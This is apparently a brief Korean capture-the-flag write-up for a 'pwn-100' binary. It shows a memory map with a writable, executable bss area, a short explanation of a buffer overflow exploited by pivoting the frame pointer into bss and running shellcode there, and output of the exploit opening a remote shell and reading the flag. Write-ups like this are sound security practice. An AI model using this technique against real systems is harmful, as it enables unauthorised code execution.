## solve

```
stitch$ vmmap
Start              End                Perm	Name
0x00400000         0x00401000         r-xp	/media/psf/Home/ctf/doubles_ctf/pwn-100/prob2
0x00600000         0x00601000         r-xp	/media/psf/Home/ctf/doubles_ctf/pwn-100/prob2
0x00601000         0x00602000         rwxp	/media/psf/Home/ctf/doubles_ctf/pwn-100/prob2
0x00007ffff7a0e000 0x00007ffff7bcd000 r-xp	/lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7bcd000 0x00007ffff7dcd000 ---p	/lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dcd000 0x00007ffff7dd1000 r-xp	/lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd1000 0x00007ffff7dd3000 rwxp	/lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd3000 0x00007ffff7dd7000 rwxp	mapped
0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp	/lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7fd7000 0x00007ffff7fda000 rwxp	mapped
0x00007ffff7ff6000 0x00007ffff7ff8000 rwxp	mapped
0x00007ffff7ff8000 0x00007ffff7ffa000 r--p	[vvar]
0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp	[vdso]
0x00007ffff7ffc000 0x00007ffff7ffd000 r-xp	/lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffd000 0x00007ffff7ffe000 rwxp	/lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffe000 0x00007ffff7fff000 rwxp	mapped
0x00007ffffffde000 0x00007ffffffff000 rwxp	[stack]
0xffffffffff600000 0xffffffffff601000 r-xp	[vsyscall]
```
bof 취약점이 있었고, bss영역에 rwxp 권한이 있었다. </br>
따라서 첫번째 페이로드에 fake_rbp를 넣어서, rbp를 bss영역으로 바꿧고, </br>
두번째 페이로드 공격에서 쉘코드를 올리고, init함수 부분의 가젯을 사용해서 bss 영역을 호출했다.

## result
```
~/machome/ctf/doubles_ctf/pwn-100(master*) » python exploit.py k                                     stitch@certis
[+] Opening connection to juwon1405.iptime.org on port 5252: Done
[*] Paused (press any to continue)
[*] Switching to interactive mode
$ id
uid=1001(prob01) gid=1001(prob01) groups=1001(prob01)
$ ls /home/prob01/
flag
prob2
$ cat /home/prob01/flag
flag{w3lc0m3_to_s0ngs4r1_rop_w0rld!}
$
```
